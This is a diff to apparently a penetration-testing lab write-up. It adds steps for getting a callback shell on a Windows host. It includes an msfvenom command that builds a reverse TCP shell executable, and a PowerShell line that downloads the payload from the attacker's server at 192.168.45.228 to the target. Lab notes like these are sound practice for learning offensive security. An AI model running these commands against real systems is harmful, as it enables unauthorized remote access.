@@ -124,7 +124,14 @@ $httpListener.Start()
 
 This shell is garbage... FTP may be working but I can not see it. I think its time to get a call back instead..
 
+generate payload on new port
+
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.228 LPORT=4445 -f exe > reverse11.exe
 ```
 
+Pull payload
+
+```powershell
+iwr -uri "192.168.45.228:8888/reverse11.exe" -outfile "C:\Users\joe\Downloads\reverse11.exe"
+```
